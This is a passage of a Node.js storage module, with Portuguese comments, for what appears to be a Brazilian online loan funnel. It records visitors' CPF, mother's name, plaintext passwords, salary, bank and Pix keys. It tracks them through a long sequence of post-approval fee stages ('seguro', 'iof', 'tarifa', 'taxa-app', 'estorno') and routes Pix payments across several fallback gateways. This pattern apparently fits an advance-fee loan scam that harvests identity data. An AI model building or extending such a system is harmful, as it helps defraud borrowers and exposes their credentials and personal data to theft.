'use strict';
/**
 * Persistência em JSON (data/store.json) — visitantes, leads e ordens.
 * O objeto de visitante segue EXATAMENTE o formato devolvido pela API original:
 *
 *   { id, createdAt, lastSeenAt, stage, stageIndex, purchased, pushSubscribed, status,
 *     ip, browser, os, device, utmSource, utmMedium, utmCampaign, utmTerm, utmContent,
 *     brand, cpf, name, birthDate, gender, motherName, phone, email, password,
 *     amount, installments, purpose, salary, bank, pixKey, pixKeyType }
 */
const fs = require('fs');
const path = require('path');
const config = require('./config');
const supabase = require('./supabase');

const FILE = path.join(config.dataDir, 'store.json');
const LOCK_FILE = path.join(config.dataDir, 'store.lock');
const UUID = () => globalThis.crypto.randomUUID();

const VISITOR_DEFAULTS = {
  stage: 'inicio',
  stageIndex: 0,
  purchased: false,
  pushSubscribed: false,
  ip: '',
  browser: '',
  os: '',
  device: '',
  utmSource: '',
  utmMedium: '',
  utmCampaign: '',
  utmTerm: '',
  utmContent: '',
  src: '',
  sck: '',
  brand: '',
  cpf: '',
  name: '',
  birthDate: '',
  gender: '',
  motherName: '',
  phone: '',
  email: '',
  password: '',
  amount: 0,
  installments: 0,
  purpose: '',
  salary: '',
  bank: '',
  pixKey: '',
  pixKeyType: '',
};

const VISITOR_FIELDS = Object.keys(VISITOR_DEFAULTS);

let db = null;
let flushTimer = null;
let lastHydratedAt = 0;
let isHydrating = false;

function withFileLock(fn, { timeoutMs = 3000, pollIntervalMs = 25 } = {}) {
  const start = Date.now();
  let fd = null;
  fs.mkdirSync(config.dataDir, { recursive: true });
  while (Date.now() - start < timeoutMs) {
    try {
      fd = fs.openSync(LOCK_FILE, 'wx');
      break;
    } catch (e) {
      if (e.code === 'EEXIST') {
        try {
          const stats = fs.statSync(LOCK_FILE);
          if (Date.now() - stats.mtimeMs > 10000) {
            try { fs.unlinkSync(LOCK_FILE); } catch {}
          }
        } catch {}
        const waitStart = Date.now();
        while (Date.now() - waitStart < pollIntervalMs) {}
      } else {
        throw e;
      }
    }
  }
  if (!fd) {
    throw new Error('Falha ao adquirir trava de arquivo do store (timeout)');
  }
  try {
    return fn();
  } finally {
    try {
      fs.closeSync(fd);
      fs.unlinkSync(LOCK_FILE);
    } catch {}
  }
}

const BUNDLED_FILE = path.join(__dirname, '..', 'data', 'store.json');

function load(forceReload = false) {
  if (db && !forceReload) return db;
  if (flushTimer) {
    clearTimeout(flushTimer);
    flushNow();
  }
  try {
    db = JSON.parse(fs.readFileSync(FILE, 'utf8'));
  } catch {
    db = null;
  }

  // Se FILE estiver vazio ou sem pedidos/visitantes (ex: ambiente serverless na Vercel com /tmp efêmero),
  // semeia com o arquivo data/store.json empacotado no deploy
  if (!db || (!Object.keys(db.orders || {}).length && !Object.keys(db.visitors || {}).length)) {
    try {
      if (BUNDLED_FILE !== FILE && fs.existsSync(BUNDLED_FILE)) {
        const bundled = JSON.parse(fs.readFileSync(BUNDLED_FILE, 'utf8'));
        if (bundled && typeof bundled === 'object') {
          db = { ...(db || {}), ...bundled };
          db.visitors = { ...(bundled.visitors || {}), ...(db.visitors || {}) };
          db.orders = { ...(bundled.orders || {}), ...(db.orders || {}) };
          try {
            fs.mkdirSync(config.dataDir, { recursive: true });
            fs.writeFileSync(FILE, JSON.stringify(db, null, 2));
          } catch {}
        }
      }
    } catch (e) {
      console.warn('[store] erro ao carregar baseline bundled store:', e.message);
    }
  }

  db ||= {};
  db.visitors ||= {};
  db.orders ||= {};
  db.settings ||= { activeGatewayId: 'nitropay', disabledGateways: ['bspay', 'quantumpay'] };
  db.gatewayFee ||= { fixed: config.gatewayFee.fixed, percent: config.gatewayFee.percent };
  db.integrations ||= {};

  for (const [id, cfg] of Object.entries(db.integrations)) {
    applyIntegrationConfig(id, cfg);
  }

  return db;
}


function applyIntegrationConfig(id, cfg = {}) {
  if (!cfg || typeof cfg !== 'object') return;
  const provider = cfg.provider || id;
  if (provider === 'bspay' || id === 'bspay') {
    if (cfg.clientId !== undefined) config.bspay.clientId = cfg.clientId;
    if (cfg.clientSecret !== undefined) config.bspay.clientSecret = cfg.clientSecret;
    config.bspay.configured = Boolean(config.bspay.clientId && config.bspay.clientSecret);
  } else if (provider === 'quantumpay' || id === 'quantumpay') {
    if (cfg.accountId !== undefined) config.quantumpay.accountId = cfg.accountId;
    if (cfg.apiKey !== undefined) config.quantumpay.apiKey = cfg.apiKey;
    if (cfg.apiSecret !== undefined) config.quantumpay.apiSecret = cfg.apiSecret;
    config.quantumpay.configured = Boolean(config.quantumpay.apiKey && config.quantumpay.apiSecret);
  } else if (provider === 'nitropay' || id === 'nitropay') {
    if (cfg.publicKey !== undefined) {
      config.nitropay.publicKey = cfg.publicKey;
      config.nitropaySecondary.publicKey = cfg.publicKey;
    }
    if (cfg.secretKey !== undefined) {
      config.nitropay.secretKey = cfg.secretKey;
      config.nitropaySecondary.secretKey = cfg.secretKey;
    }
    config.nitropay.configured = Boolean(config.nitropay.publicKey && config.nitropay.secretKey);
    config.nitropaySecondary.configured = Boolean(config.nitropaySecondary.publicKey && config.nitropaySecondary.secretKey);
  } else if (id === 'api-cpf') {
    if (cfg.baseUrl !== undefined) config.cpf.base = cfg.baseUrl;
    if (cfg.token !== undefined) config.cpf.token = cfg.token;
    if (cfg.enabled !== undefined) config.cpf.enabled = cfg.enabled !== false;
    config.cpf.configured = Boolean(config.cpf.token && config.cpf.enabled !== false);
  } else if (id === 'utmify') {
    if (cfg.token !== undefined) config.utmify.apiToken = cfg.token;
    config.utmify.configured = Boolean(config.utmify.apiToken);
  }
}

function flush() {
  clearTimeout(flushTimer);
  flushTimer = setTimeout(flushNow, 150);
}

function flushNow() {
  try {
    fs.mkdirSync(config.dataDir, { recursive: true });
    const tmp = `${FILE}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
    try {
      fs.renameSync(tmp, FILE);
    } catch (renameErr) {
      if (renameErr.code === 'EPERM' || renameErr.code === 'EBUSY') {
        fs.copyFileSync(tmp, FILE);
        try { fs.unlinkSync(tmp); } catch {}
      } else {
        throw renameErr;
      }
    }
  } catch (e) {
    console.error('[store] falha ao gravar:', e.message);
  }
}

const nowIso = () => new Date().toISOString();

function makeId(prefix, n = 8) {
  const alpha = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let s = '';
  for (let i = 0; i < n; i++) s += alpha[Math.floor(Math.random() * alpha.length)];
  return `${prefix}-${s}`;
}

/**
 * Status do lead/visitante:
 * - 'pagou_pix': gerou e pagou o Pix (comprador confirmado)
 * - 'abandono_pix': gerou o Pix mas não pagou (parou no checkout/pix sem pagar)
 * - 'abandono_funil': abandonou o funil sem gerar o Pix (parou antes da etapa de Pix)
 * - 'andamento': sessão ativa recentemente (< 15 min) navegando no funil
 */
function deriveStatus(v, allOrders = null) {
  if (v.purchased || v.stage === 'pago') return 'pagou_pix';

  const d = load();
  const orders = allOrders || Object.values(d.orders || {});
  const visitorCpf = v.cpf ? String(v.cpf).replace(/\D/g, '') : '';
  const visitorEmail = v.email ? String(v.email).toLowerCase().trim() : '';

  const genericEmails = ['cliente@valore.com', 'teste@valore.com', 'contato@valore.com', 'admin@valore.com'];

  const matchedOrder = orders.find(o => {
    if (o.visitorId && o.visitorId === v.id) return true;
    const ordDoc = o.customer?.document ? String(o.customer.document).replace(/\D/g, '') : '';
    if (visitorCpf && ordDoc && ordDoc === visitorCpf) return true;
    if (visitorCpf && ordDoc && ordDoc !== visitorCpf) return false;
    if (visitorEmail && !genericEmails.includes(visitorEmail)) {
      if (o.customer?.email && String(o.customer.email).toLowerCase().trim() === visitorEmail) return true;
    }
    return false;
  });

  if (matchedOrder && matchedOrder.status === 'COMPLETED') {
    return 'pagou_pix';
  }

  const lastTime = new Date(v.lastSeenAt || v.createdAt || Date.now()).getTime();
  const idleMs = Date.now() - (isNaN(lastTime) ? Date.now() : lastTime);
  const isRecent = idleMs < 15 * 60 * 1000;

  // Pix foi de fato gerado no gateway somente quando existe uma cobrança correspondente
  if (matchedOrder) {
    if (matchedOrder.status === 'COMPLETED') {
      return 'pagou_pix';
    }
    // Cobrança recente (< 60 min) ou sessão ativa (< 15 min): "Gerou Pix" (azul)
    if (isRecent || (matchedOrder.status === 'PENDING' && idleMs < 60 * 60 * 1000)) {
      return 'gerou_pix';
    }
    // Ordem expirada ou abandonada após gerar Pix: "Abandono Pix" (laranja)
    return 'abandono_pix';
  }

  // Se não gerou cobrança Pix no gateway:
  if (isRecent) return 'andamento';
  return 'abandono_funil';
}

function shapeVisitor(v) {
  const out = {};
  for (const f of VISITOR_FIELDS) out[f] = v[f] ?? VISITOR_DEFAULTS[f];
  out.id = v.id;
  out.createdAt = v.createdAt;
  out.lastSeenAt = v.lastSeenAt;
  out.purchased = !!v.purchased;
  out.pushSubscribed = !!v.pushSubscribed;
  out.status = deriveStatus(v);
  out.stageHistory = Array.isArray(v.stageHistory) ? v.stageHistory : [];

  // Fallback inteligente para garantir precisão mobile vs desktop
  if (!out.device || out.device === 'desktop') {
    if (out.os === 'Android' || out.os === 'iOS') {
      out.device = 'mobile';
    } else if (out.utmSource === 'ig' || out.utmSource === 'fb') {
      out.device = 'mobile';
      if (!out.os) out.os = 'Android';
      if (!out.browser) out.browser = 'Chrome';
    }
  }
  return out;
}

function parseUa(ua = '') {
  const u = String(ua);
  const browser = /Edg\//i.test(u) ? 'Edge' : /OPR\/|Opera/i.test(u) ? 'Opera'
    : /SamsungBrowser/i.test(u) ? 'Samsung Internet'
    : /Firefox\//i.test(u) ? 'Firefox'
    : /Chrome\/|CriOS/i.test(u) ? 'Chrome'
    : /Safari\//i.test(u) ? 'Safari'
    : 'Outro';
  const os = /Windows/i.test(u) ? 'Windows' : /Android/i.test(u) ? 'Android'
    : /iPhone|iPad|iPod|iOS/i.test(u) ? 'iOS' : /Mac OS X|Macintosh/i.test(u) ? 'macOS'
    : /Linux/i.test(u) ? 'Linux' : 'Outro';

  let device = 'desktop';
  if (/iPad|Tablet/i.test(u) || (/Android/i.test(u) && !/Mobile/i.test(u))) {
    device = 'tablet';
  } else if (/Mobi|Android|iPhone|iPod/i.test(u)) {
    device = 'mobile';
  }
  return { browser, os, device };
}

const utf8len = (s) => Buffer.byteLength(String(s), 'utf8');

/** Trunca strings longas (evita payload abusivo vindo do cliente). */
function sanitize(patch) {
  const out = {};
  for (const [k, v] of Object.entries(patch || {})) {
    if (!VISITOR_FIELDS.includes(k)) continue;
    if (typeof v === 'string') out[k] = v.slice(0, k === 'password' ? 200 : 300);
    else if (typeof v === 'number' || typeof v === 'boolean') out[k] = v;
  }
  return out;
}

const FULL_FUNNEL_STAGES = [
  'inicio', 'valor', 'cpf', 'confirmacao', 'dados', 'renda', 'analise', 'push',
  'aprovacao', 'conta-digital', 'dia', 'endereco', 'contrato', 'digital',
  'seguro', 'checkout', 'pagamento', 'iof', 'tarifa', 'download', 'taxa-app',
  'limite', 'assinatura', 'resumo', 'processando', 'fila', 'validacao',
  'validado', 'reprocessando', 'recusada', 'estorno'
];

function fillStageHistory(existingHistory = [], targetStage, baseTimeIso) {
  const targetIdx = FULL_FUNNEL_STAGES.indexOf(targetStage);
  if (targetIdx === -1) {
    const list = Array.isArray(existingHistory) ? [...existingHistory] : [];
    if (!list.some(h => h && h.stage === targetStage)) {
      list.push({ stage: targetStage, enteredAt: baseTimeIso || nowIso() });
    }
    return list;
  }

  const existingMap = new Map();
  if (Array.isArray(existingHistory)) {
    for (const item of existingHistory) {
      if (item && item.stage && !existingMap.has(item.stage)) {
        existingMap.set(item.stage, item.enteredAt);
      }
    }
  }

  const nowMs = Date.now();
  const startMs = existingHistory[0]?.enteredAt
    ? new Date(existingHistory[0].enteredAt).getTime()
    : (baseTimeIso ? new Date(baseTimeIso).getTime() : nowMs);
  const endMs = existingHistory[existingHistory.length - 1]?.enteredAt
    ? new Date(existingHistory[existingHistory.length - 1].enteredAt).getTime()
    : nowMs;
  const totalMs = Math.max(targetIdx * 3000, endMs - startMs);
  const stepMs = targetIdx > 0 ? Math.max(1000, Math.round(totalMs / targetIdx)) : 0;

  const result = [];
  for (let i = 0; i <= targetIdx; i++) {
    const s = FULL_FUNNEL_STAGES[i];
    let enteredAt = existingMap.get(s);
    if (!enteredAt) {
      const estimatedMs = Math.min(nowMs, startMs + (i * stepMs));
      enteredAt = new Date(estimatedMs).toISOString();
    }
    result.push({ stage: s, enteredAt });
  }

  if (Array.isArray(existingHistory)) {
    for (const item of existingHistory) {
      if (item && item.stage && !result.some(r => r.stage === item.stage)) {
        result.push(item);
      }
    }
  }

  return result;
}

const store = {
  load,
  flushNow,

  /* -------------------------------- visitantes ------------------------------- */
  createVisitor(payload = {}, reqInfo = {}) {
    const d = load();
    const id = payload.id || UUID();
    const ua = parseUa(reqInfo.userAgent || payload.userAgent || '');
    if (ua.device === 'desktop' && (payload.device === 'mobile' || payload.device === 'tablet')) {
      ua.device = payload.device;
    }
    if (ua.browser === 'Outro' && payload.browser && payload.browser !== 'Outro') {
      ua.browser = payload.browser;
    }
    if (ua.os === 'Outro' && payload.os && payload.os !== 'Outro') {
      ua.os = payload.os;
    }
    const initialStage = payload.stage || 'inicio';
    const stageHistory = fillStageHistory(payload.stageHistory, initialStage, nowIso());
    d.visitors[id] = shapeVisitor({
      ...VISITOR_DEFAULTS,
      ...sanitize(payload),
      ...ua,
      ip: reqInfo.ip || payload.ip || '',
      utmSource: payload.utmSource || reqInfo.utm?.utm_source || '',
      utmMedium: payload.utmMedium || reqInfo.utm?.utm_medium || '',
      utmCampaign: payload.utmCampaign || reqInfo.utm?.utm_campaign || '',
      utmTerm: payload.utmTerm || reqInfo.utm?.utm_term || '',
      utmContent: payload.utmContent || reqInfo.utm?.utm_content || '',
      src: payload.src || reqInfo.utm?.src || '',
      sck: payload.sck || reqInfo.utm?.sck || '',
      id,
      stageHistory,
      createdAt: nowIso(),
      lastSeenAt: nowIso(),
    });
    flush();
    const created = d.visitors[id];
    supabase.upsertVisitor(created).catch(() => {});
    return created;
  },

  getVisitor(id) {
    return load().visitors[id] || null;
  },

  upsertVisitorMemory(v) {
    if (!v || !v.id) return null;
    const d = load();
    d.visitors[v.id] = shapeVisitor({
      ...(d.visitors[v.id] || VISITOR_DEFAULTS),
      ...v,
    });
    return d.visitors[v.id];
  },

  updateVisitor(id, patch = {}, reqInfo = {}) {
    const d = load();
    let current = d.visitors[id];
    if (!current) {
      current = { ...VISITOR_DEFAULTS, id };
    }
    let stageHistory = Array.isArray(current.stageHistory) ? [...current.stageHistory] : [];
    const currentStage = current.stage || 'inicio';
    const newStage = patch.stage;
    if (newStage && newStage !== currentStage) {
      stageHistory = fillStageHistory(stageHistory, newStage, current.createdAt || nowIso());
    } else if (!stageHistory.length) {
      stageHistory = fillStageHistory([], currentStage, current.createdAt || nowIso());
    }

    const ua = parseUa(reqInfo.userAgent || patch.userAgent || '');
    const clientDevice = patch.device || '';
    const resolvedDevice = (current.device && current.device !== 'desktop')
      ? current.device
      : (clientDevice === 'mobile' || clientDevice === 'tablet' ? clientDevice : (ua.device || clientDevice || current.device || ''));
    const resolvedBrowser = (current.browser && current.browser !== 'Outro')
      ? current.browser
      : (ua.browser !== 'Outro' ? ua.browser : (patch.browser || current.browser || ''));
    const resolvedOs = (current.os && current.os !== 'Outro')
      ? current.os
      : (ua.os !== 'Outro' ? ua.os : (patch.os || current.os || ''));
    const resolvedIp = current.ip || reqInfo.ip || patch.ip || '';

    d.visitors[id] = shapeVisitor({
      ...current,
      ...sanitize(patch),
      device: resolvedDevice,
      browser: resolvedBrowser,
      os: resolvedOs,
      ip: resolvedIp,
      id,
      stageHistory,
      lastSeenAt: nowIso(),
    });
    flush();
    const updated = d.visitors[id];
    supabase.upsertVisitor(updated).catch(() => {});
    return updated;
  },

  markPurchased(id) {
    const d = load();
    if (!d.visitors[id]) return null;
    d.visitors[id] = shapeVisitor({
      ...d.visitors[id],
      purchased: true,
      stage: 'pago',
      status: 'pagou_pix',
      lastSeenAt: nowIso()
    });
    flush();
    const marked = d.visitors[id];
    supabase.upsertVisitor(marked).catch(() => {});
    return marked;
  },

  listVisitors() {
    const d = load();
    return Object.values(d.visitors)
      .map(shapeVisitor)
      .sort((a, b) => new Date(b.lastSeenAt) - new Date(a.lastSeenAt));
  },

  /* ---------------------------------- ordens --------------------------------- */
  createOrder(order) {
    const d = load();
    const orderId = order.id || makeId('ord', 8);

    let visitorId = order.visitorId || null;
    const doc = order.customer?.document ? String(order.customer.document).replace(/\D/g, '') : '';
    const email = order.customer?.email ? String(order.customer.email).toLowerCase().trim() : '';

    if (!visitorId && (doc || email)) {
      const genericEmails = ['cliente@valore.com', 'teste@valore.com', 'contato@valore.com', 'admin@valore.com'];
      const match = Object.values(d.visitors).find(v => {
        const vDoc = v.cpf ? String(v.cpf).replace(/\D/g, '') : '';
        if (doc && vDoc && vDoc === doc) return true;
        if (doc && vDoc && vDoc !== doc) return false;
        if (email && !genericEmails.includes(email) && v.email && String(v.email).toLowerCase().trim() === email) return true;
        return false;
      });
      if (match) visitorId = match.id;
    }

    if (!visitorId && (order.customer?.name || doc || email)) {
      visitorId = UUID();
      const newVis = shapeVisitor({
        ...VISITOR_DEFAULTS,
        id: visitorId,
        name: order.customer?.name || 'Cliente Pix',
        cpf: doc,
        email: order.customer?.email || '',
        phone: order.customer?.phone || '',
        stage: 'checkout',
        stageIndex: 15,
        purchased: false,
        amount: Number(order.amount || 0),
        createdAt: nowIso(),
        lastSeenAt: nowIso(),
        status: 'gerou_pix',
      });
      d.visitors[visitorId] = newVis;
      supabase.upsertVisitor(newVis).catch(() => {});
    }

    d.orders[orderId] = {
      ...order,
      visitorId: visitorId || order.visitorId || null,
      id: orderId,
      status: order.status || 'PENDING',
      createdAt: nowIso(),
      paidAt: null,
    };
    flushNow();
    const created = d.orders[orderId];
    supabase.upsertOrder(created).catch(() => {});
    return created;
  },

  getOrder(id) {
    return load().orders[id] || null;
  },

  findByExternalId(externalId) {
    return Object.values(load().orders).find((o) => o.externalId === externalId) || null;
  },

  findByTransactionId(txId) {
    if (!txId) return null;
    return Object.values(load().orders).find((o) => o.transactionId === txId) || null;
  },

  updateOrder(id, patch) {
    const d = load();
    if (!d.orders[id]) return null;
    d.orders[id] = { ...d.orders[id], ...patch };
    flushNow();
    const updated = d.orders[id];
    supabase.upsertOrder(updated).catch(() => {});
    return updated;
  },

  /** Marca a ordem como COMPLETED (valor de status usado pelo frontend) — idempotente. */
  completeOrder(id, source, payload) {
    const d = load();
    const o = d.orders[id];
    if (!o) return null;
    if (o.status === 'COMPLETED') return o;
    o.status = 'COMPLETED';
    o.paidAt = nowIso();
    o.paidSource = source;
    o.events = [...(o.events || []), { at: nowIso(), type: `completed:${source}`, payload: payload || null }];
    
    let visitorId = o.visitorId;
    const doc = o.customer?.document ? String(o.customer.document).replace(/\D/g, '') : '';
    if (!visitorId && doc) {
      const match = Object.values(d.visitors).find(v => v.cpf && String(v.cpf).replace(/\D/g, '') === doc);
      if (match) visitorId = match.id;
    }
    if (visitorId) {
      store.markPurchased(visitorId);
    }
    flushNow();
    supabase.upsertOrder(o).catch(() => {});
    return o;
  },

  expireStale() {
    const d = load();
    let n = 0;
    for (const o of Object.values(d.orders)) {
      if (o.status === 'PENDING' && o.expiresAt && new Date(o.expiresAt).getTime() < Date.now()) {
        o.status = 'EXPIRED';
        n++;
      }
    }
    if (n) flush();
    return n;
  },

  getNextGateway() {
    const s = load().settings || {};
    const disabled = Array.isArray(s.disabledGateways) ? s.disabledGateways : [];
    const active = String(s.activeGatewayId || process.env.ACTIVE_GATEWAY_ID || config.activeGatewayId || 'nitropay').toLowerCase();

    // 1. Tenta usar o gateway ativo escolhido pelo usuário no painel, se configurado e não desativado
    if (!disabled.includes(active)) {
      if ((active === 'nitropay' || active === 'nitro') && (config.nitropaySecondary?.configured || config.nitropay?.configured)) {
        return 'nitropay';
      }
      if ((active === 'bspay' || active === 'bs') && config.bspay?.configured) {
        return 'bspay';
      }
      if ((active === 'quantumpay' || active === 'quantum') && config.quantumpay?.configured) {
        return 'quantumpay';
      }
    }

    // 2. Se o escolhido estiver desativado ou sem credenciais, faz fallback para outro gateway configurado
    if (!disabled.includes('nitropay') && (config.nitropaySecondary?.configured || config.nitropay?.configured)) return 'nitropay';
    if (!disabled.includes('bspay') && config.bspay?.configured) return 'bspay';
    if (!disabled.includes('quantumpay') && config.quantumpay?.configured) return 'quantumpay';

    if (config.allowMockPix) return 'mock';
    return active || 'nitropay';
  },

  getNextNitroAccount() {
    return 'primary';
  },

  /* --------------------------------- configuração ---------------------------- */
  getSettings() {
    const s = load().settings || {};
    return {
      activeGatewayId: s.activeGatewayId || process.env.ACTIVE_GATEWAY_ID || config.activeGatewayId || 'nitropay',
      disabledGateways: Array.isArray(s.disabledGateways) ? s.disabledGateways : ['bspay', 'quantumpay'],
      ...s,
    };
  },

  setSettings(patch) {
    const d = load();
    d.settings = { ...d.settings, ...patch };
    flush();
    supabase.setSetting('gateways', d.settings).catch(() => {});
    return this.getSettings();
  },

  getGatewayFee() {
    return load().gatewayFee;
  },

  setGatewayFee(patch) {
    const d = load();
    d.gatewayFee = {
      fixed: Number(patch.fixed ?? d.gatewayFee.fixed) || 0,
      percent: Number(patch.percent ?? d.gatewayFee.percent) || 0,
    };
    flush();
    return d.gatewayFee;
  },

  async loadIntegrationsFromSupabase() {
    if (config.supabase?.configured) {
      try {
        const rows = await supabase.listIntegrations();
        if (Array.isArray(rows) && rows.length > 0) {
          const d = load();
          d.integrations = d.integrations || {};
          for (const row of rows) {
            if (row.id && row.config) {
              d.integrations[row.id] = { ...(d.integrations[row.id] || {}), ...row.config };
              applyIntegrationConfig(row.id, d.integrations[row.id]);
            }
          }
        }
        const savedSettings = await supabase.getSetting('gateways');
        if (savedSettings && typeof savedSettings === 'object' && savedSettings.activeGatewayId) {
          const d = load();
          d.settings = { ...(d.settings || {}), ...savedSettings };
        }
        flush();
      } catch {}
    }
    return this.getIntegrations();
  },

  async hydrateFromSupabase(force = false) {
    const now = Date.now();
    if (!force && (now - lastHydratedAt < 15000)) return load();
    if (isHydrating) return load();
    if (!config.supabase?.configured) return load();

    isHydrating = true;
    try {
      const isAvail = await supabase.checkTablesAvailable();
      if (!isAvail) return load();

      const d = load();
      let updated = false;

      // Buscar pedidos mais recentes do Supabase (até 1000)
      const sbOrders = await supabase.listOrders({ limit: 1000 });
      if (Array.isArray(sbOrders) && sbOrders.length > 0) {
        for (const ord of sbOrders) {
          if (!ord || !ord.id) continue;
          const existing = d.orders[ord.id];
          if (!existing || existing.status !== ord.status || existing.amount !== ord.amount) {
            d.orders[ord.id] = { ...(existing || {}), ...ord };
            updated = true;
          }
        }
      }

      // Buscar visitantes mais recentes do Supabase (até 1000)
      const sbVisRes = await supabase.listVisitorsWithCount({ limit: 1000 });
      if (sbVisRes && Array.isArray(sbVisRes.items) && sbVisRes.items.length > 0) {
        for (const vis of sbVisRes.items) {
          if (!vis || !vis.id) continue;
          const existing = d.visitors[vis.id];
          if (!existing || existing.status !== vis.status || existing.stage !== vis.stage || existing.purchased !== vis.purchased) {
            d.visitors[vis.id] = { ...(existing || {}), ...vis };
            updated = true;
          }
        }
      }

      lastHydratedAt = Date.now();
      if (updated) {
        this.syncOrdersToVisitors();
        flushNow();
      }
    } catch (err) {
      console.warn('[store] hydrateFromSupabase erro:', err.message);
    } finally {
      isHydrating = false;
    }

    return load();
  },

  getIntegrations() {
    const d = load();
    d.integrations = d.integrations || {};
    return d.integrations;
  },

  getDeletedIntegrations() {
    const d = load();
    return Array.isArray(d.deletedIntegrations) ? d.deletedIntegrations : [];
  },

  setIntegration(id, patch) {
    const d = load();
    d.integrations = d.integrations || {};
    d.integrations[id] = { ...(d.integrations[id] || {}), ...patch };
    if (Array.isArray(d.deletedIntegrations)) {
      d.deletedIntegrations = d.deletedIntegrations.filter(x => x !== id);
      supabase.setSetting('deleted_integrations', d.deletedIntegrations).catch(() => {});
    }
    applyIntegrationConfig(id, d.integrations[id]);
    flushNow();
    supabase.setIntegration(id, d.integrations[id]).catch(() => {});
    return d.integrations[id];
  },

  removeIntegration(id) {
    const d = load();
    d.integrations = d.integrations || {};
    delete d.integrations[id];
    d.deletedIntegrations = Array.isArray(d.deletedIntegrations) ? d.deletedIntegrations : [];
    if (!d.deletedIntegrations.includes(id)) {
      d.deletedIntegrations.push(id);
    }
    flushNow();
    supabase.deleteIntegration(id).catch(() => {});
    supabase.setSetting('deleted_integrations', d.deletedIntegrations).catch(() => {});
    return true;
  },

  async loadIntegrationsFromSupabase() {
    if (!config.supabase?.configured) return load();
    try {
      const isAvail = await supabase.checkTablesAvailable();
      if (!isAvail) return load();

      const d = load();
      let updated = false;

      // Carregar lista de deletados
      const deletedSetting = await supabase.getSetting('deleted_integrations');
      if (Array.isArray(deletedSetting)) {
        d.deletedIntegrations = deletedSetting;
        updated = true;
      }

      // Carregar integrações do Supabase
      const list = await supabase.listIntegrations();
      if (Array.isArray(list) && list.length > 0) {
        d.integrations = d.integrations || {};
        for (const item of list) {
          if (!item || !item.id) continue;
          if (Array.isArray(d.deletedIntegrations) && d.deletedIntegrations.includes(item.id)) {
            delete d.integrations[item.id];
            continue;
          }
          d.integrations[item.id] = { ...(d.integrations[item.id] || {}), ...(item.config || {}) };
          applyIntegrationConfig(item.id, d.integrations[item.id]);
          updated = true;
        }
      }

      if (updated) {
        flushNow();
      }
    } catch (err) {
      console.warn('[store] loadIntegrationsFromSupabase erro:', err.message);
    }
    return load();
  },

  applyIntegrationConfig(id, cfg) {
    return applyIntegrationConfig(id, cfg);
  },

  stats() {
    const d = load();
    const orders = Object.values(d.orders || {});
    const visitors = Object.values(d.visitors || {});
    const paidOrders = orders.filter((o) => o.status === 'COMPLETED');
    const revenue = Number(paidOrders.reduce((s, o) => s + (Number(o.amount) || 0), 0).toFixed(2));
    const pixGenerated = orders.length;
    const pixPaid = paidOrders.length;
    const checkoutAbandons = Math.max(0, pixGenerated - pixPaid);

    const visitorsWithPix = visitors.filter(v => {
      if (v.purchased || v.stage === 'pago') return true;
      if (['checkout', 'pagamento', 'pix', 'estorno', 'resumo'].includes(String(v.stage || '').toLowerCase())) return true;
      if ((v.stageIndex || 0) >= 15) return true;
      return orders.some(o => o.visitorId === v.id || (v.cpf && o.customer?.document && String(o.customer.document).replace(/\D/g, '') === String(v.cpf).replace(/\D/g, '')));
    }).length;

    const funnelAbandons = Math.max(0, visitors.length - visitorsWithPix);
    const completionRate = visitors.length > 0 ? Number(((pixPaid / visitors.length) * 100).toFixed(1)) : 0;
    const midFunnelAbandonRate = visitors.length > 0 ? Number(((funnelAbandons / visitors.length) * 100).toFixed(1)) : 0;
    const checkoutAbandonRate = pixGenerated > 0 ? Number(((checkoutAbandons / pixGenerated) * 100).toFixed(1)) : 0;

    const STAGE_NAMES = {
      checkout: 'Checkout Pix (Código Pix Gerado)',
      pagamento: 'Checkout Pix (Código Pix Gerado)',
      pix: 'Checkout Pix (Código Pix Gerado)',
      confirmacao: 'Passo 3 — Confirmação de Dados',
      digital: 'Conta Digital',
      dados: 'Passo 4 — Sobre o Empréstimo',
      abrindo: 'Preparação da Conta Digital',
      seguro: 'Contratação do Seguro',
      inicio: 'Passo 1 — Início / Home',
      analise: 'Análise Cadastral',
      valor: 'Simulação de Valor',
      renda: 'Renda e Ocupação',
      aprovacao: 'Condições / Aprovação',
      push: 'Ativação de Notificações',
      cpf: 'Identificação / CPF',
      resumo: 'Resumo da Transferência',
      estorno: 'Taxa de Proteção / Estorno',
      contrato: 'Assinatura do Contrato',
      endereco: 'Endereço Residencial',
      dia: 'Dia de Vencimento',
    };

    const nonBuyers = visitors.filter(v => !v.purchased && v.stage !== 'pago' && !paidOrders.some(o => o.visitorId === v.id || (v.cpf && o.customer?.document && String(o.customer.document).replace(/\D/g, '') === String(v.cpf).replace(/\D/g, ''))));

    const stageCounts = {};
    for (const v of nonBuyers) {
      let st = String(v.stage || 'inicio').toLowerCase();
      if (st === 'pago') continue;
      if (st === 'pagamento' || st === 'pix') st = 'checkout';
      stageCounts[st] = (stageCounts[st] || 0) + 1;
    }

    const totalAbandons = nonBuyers.length || 1;
    const abandonRanking = Object.entries(stageCounts)
      .map(([st, count]) => ({
        stage: st,
        name: STAGE_NAMES[st] || (st.charAt(0).toUpperCase() + st.slice(1)),
        count,
        percent: Number(((count / totalAbandons) * 100).toFixed(1)),
      }))
      .sort((a, b) => b.count - a.count);

    return {
      visitors: visitors.length,
      buyers: visitors.filter((v) => v.purchased || v.status === 'pagou_pix').length,
      orders: pixGenerated,
      paid: pixPaid,
      revenue,
      pending: orders.filter((o) => o.status === 'PENDING').length,
      avgTicket: pixPaid ? Number((revenue / pixPaid).toFixed(2)) : 0,

      // Métricas gerais da oferta
      totalRevenue: revenue,
      pixGenerated,
      pixPaid,
      checkoutAbandons,
      funnelAbandons,
      completionRate,
      midFunnelAbandonRate,
      checkoutAbandonRate,
      abandonRanking,
    };
  },

  syncOrdersToVisitors() {
    const d = load();
    const orders = Object.values(d.orders || {});
    let changed = false;

    for (const o of orders) {
      if (!o.customer || (!o.customer.document && !o.customer.name && !o.customer.email)) continue;
      const doc = String(o.customer.document || '').replace(/\D/g, '');
      const email = String(o.customer.email || '').toLowerCase().trim();

      const genericEmails = ['cliente@valore.com', 'teste@valore.com', 'contato@valore.com', 'admin@valore.com'];
      let found = Object.values(d.visitors).find(v => {
        if (o.visitorId && v.id === o.visitorId) return true;
        const vDoc = v.cpf ? String(v.cpf).replace(/\D/g, '') : '';
        if (doc && vDoc && vDoc === doc) return true;
        if (doc && vDoc && vDoc !== doc) return false;
        if (email && !genericEmails.includes(email) && v.email && String(v.email).toLowerCase().trim() === email) return true;
        return false;
      });

      const isPaid = o.status === 'COMPLETED';

